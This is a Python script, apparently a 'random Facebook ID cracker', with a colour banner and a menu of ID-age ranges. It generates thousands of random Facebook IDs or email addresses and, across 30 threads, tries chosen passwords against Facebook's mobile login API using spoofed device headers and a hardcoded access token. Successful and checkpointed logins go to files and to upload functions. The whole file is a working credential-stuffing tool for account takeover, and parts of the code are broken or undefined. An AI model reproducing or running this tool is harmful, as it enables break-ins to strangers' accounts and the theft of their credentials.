W = '\x1b[0;92m' 
R = '\x1b[0;92m' 
G = '\x1b[0;92m' 
Y = '\x1b[0;92m' 
B = '\x1b[0;92m'
P = '\x1b[0;92m'
C = '\x1b[0;92m'
N = '\x1b[0m'



import os,uuid
try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")

import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor


def runtxt(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

banner = """
\033[1;37;1m╭━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━╮
\033[1;35;1m╰━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━╯
  
  \033[1;32m                .   ## ##     ## ########  
   \033[1;32m                 ##  ##   ##  ##     ## 
  \033[1;32m                  ##   ## ##   ##     ## 
     \033[1;32m               ##    ###    ########  
       \033[1;32m       ##    ##   ## ##   ##     ## 
       \033[1;32m       ##    ##  ##   ##  ##     ## 
     \033[1;32m          ######  ##     ## ########
  \033[1;92m╔════════════════════════════╗╔══════════════════════════╗
  \033[1;91;1m█ \033[1;37m [•] \033[1;31;1mTOOLS OWNER     \033[1;37m [•]  \033[1;32m║║ \033[1;37m [•] \033[1;31;1m AWAIS TAHIR \033[1;37m  [•]  \033[1;31m█ 
  \033[1;31;1m█ \033[1;37m [•] \033[1;32;1mFACEBOOK PAGE   \033[1;37m [•]\033[1;32m  ║║ \033[1;37m [•] \033[1;32m  TECH MASTER    \033[1;37m[•]  \033[1;31m█ 
  \033[1;31;1m█ \033[1;37m [•] \033[1;33;1mGITHUB USER     \033[1;37m [•]\033[1;32m  ║║ \033[1;37m [•] \033[1;33m  JUTTBRAND     \033[1;37m[•]  \033[1;31m█ 
  \033[1;31;1m█ \033[1;37m [•] \033[1;34;1mWHATS APP NUMBER\033[1;37m [•]  \033[1;32m║║ \033[1;37m [•] \033[1;34m+97696784016 \033[1;37m[•]  \033[1;31m█ 
  \033[1;31;1m█ \033[1;37m [•] \033[1;35;1mTOOLS VERTION   \033[1;37m [•]  \033[1;32m║║ \033[1;37m [•] \033[1;35m     1.5     \033[1;37m[•]  \033[1;31m█ 
  \033[1;31;1m█ \033[1;37m [•] \033[1;36;1mTOOLS STATUS    \033[1;37m [•] \033[1;32m ║║ \033[1;37m [•] \033[1;36m  PREMIUM      \033[1;37m[•]  \033[1;31m█ 
  \033[1;31;1m█ \033[1;37m [•] \033[1;37;1mTOOLS NAME      \033[1;37m [•] \033[1;32m ║║ \033[1;37m [•] \033[1;37m   RANDOM     \033[1;37m[•]  \033[1;31m█
  \033[1;92m╚════════════════════════════╝╚══════════════════════════╝          
  \033[1;36;1m╭━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━╮
  \033[1;35;1m╰━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━╯"""

              
              

class timer:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		#FUCK DARK CYBER
		print(logo)
		print("%s [%s1%s]%s CRACK RANDOM FB ID 2012-15 %s(Pro)"%(R,Y,R,G,Y))
		print("%s [%s2%s]%s CRACK RANDOM FB ID 2011-13 %s(Pro)"%(R,Y,R,G,Y))
		print("%s [%s3%s]%s CRACK RANDOM FB ID 2008-11 %s(Pro)"%(R,Y,R,G,Y))
		print("%s [%s4%s]%s CRACK RANDOM FB ID 2009-10 %s(Pro)"%(R,Y,R,G,Y))
		print("%s [%s5%s]%s CRACK RANDOM FB ID 2005-7 %s(Pro) V1"%(R,Y,R,G,Y))
		print("%s [%s6%s]%s CRACK RANDOM FB ID 2004-6 %s(Pro) V2"%(R,Y,R,G,Y))
		print("%s [%s7%s]%s CRACK RANDOM FB ID 2004-5 %s(Pro) V3"%(R,Y,R,G,Y))
		print("%s [%s8%s]%s CRACK RANDOM FB ID 2003-4 %s(Pro) V4"%(R,Y,R,G,Y))
		hoga = input("\n%s [?] CHOICE : "%(B))
		if hoga in ["", " "]:
			timer()
		elif hoga in ["1", "01"]:
			self.old_11()
		elif hoga in ["2", "02"]:
		        self.old_11()
		elif hoga in ["3", "03"]:
			self.psy()
		elif hoga in ["4", "04"]:
			self.oldcrack()
		elif hoga in ["5", "05"]:
			self.old4_7()
		elif hoga in ["6", "06"]:
			self.old4_6()
		elif hoga in ["7", "07"]:
			self.old4_5()
		elif hoga in ["8", "08"]:
			self.oldcrack()
		elif hoga in ["9", "09"]:
			self.email()
		elif hoga in ["10","10"]:
			self.risat()
			timer()

	def psy(self):
		x = 111111111
		xx = 999999999
		idx = "100000"
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> risat-ok.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> risat-cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				print("\033[1;97m===============================================================")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))

	def picchi(self):
		x = 1111111
		xx = 9999999
		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> JXB-ok.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> JXB-cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				print("\033[1;97m===============================================================")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))
		
		
	def old4_7(self):
		x = 11111111
		xx = 99999999
		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))
		if (limit)>10000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> JXB-ok.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> jxb-cp.txt"%(R))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				print("\033[1;97m===============================================================")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))


	def old4_6(self):
		x = 1111111
		xx = 9999999
		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))
		if (limit)>10000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> JXB-ok.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> JXB-cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				print("\033[1;97m===============================================================")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))
		
		
	def old4_5(self):
		x = 111111
		xx = 999999
		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))
		if (limit)>10000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> JXB-ok.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> JXB-cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				print("\033[1;97m===============================================================")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))
		

	def old_11(self):
		x = 1111111111111
		xx = 9999999999999
		idx = "50000"
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
		if (limit)>10000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))  
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> JXB-ok.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> JXB-cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				print("\033[1;97m===============================================================")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))
		
		
	def old_13(self):
		x = 1111111111111
		xx = 9999999999999
		idx = "1000"
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))  
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> JXB-CP.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> JXB-CP.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				print("\033[1;97m===============================================================")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))


	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX : RISAT): "%(Y,G))
		nam = nam.replace(" ", "")
		print("%s EXAMPLE  : %s@gmail.com, @yahoo.com, @hotmail.com ETC"%(Y,G))
		idx = input("%s DOMAIN  : "%(B))
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				___ = nam
				self.id.append(___+str(_)+__)
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
				listpass = input(" [?] ENTER PASSWORD : ")
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> JXB-ok.txt"%(G))
				print("%s [+] CP RESULT SAVED IN -> JXB-cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				print("\033[1;97m===============================================================")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))
		
	def oldcrack(self):
		x = 11111111
		xx = 99999999
		idx = " 1000000"
		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
		if (limit)>50000:
			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK RESULTS SAVED IN -> JXB-ok.txt"%(G))
				print("%s [+] CP RESULTS SAVED IN -> JXB-cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				print("\033[1;97m===============================================================")
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
		except Exception as e:exit(str(e))
		

	def api(self, uid, pwx):
		ua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
			"Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16';]"
			"Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36;]"
		])
		sys.stdout.write("\r\r %s[J-X-B]  %s/%s   \033[0;92m[OK:-%s]    \033[0;91m[CP:-%s]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[JXB-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [JXB-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[JXB-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [JXB-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue

		self.loop +=1

if len(sys.argv) == 2:
	if sys.argv[1] == "--help" or sys.argv[1] == "-h":
		helpnote()
                timer()
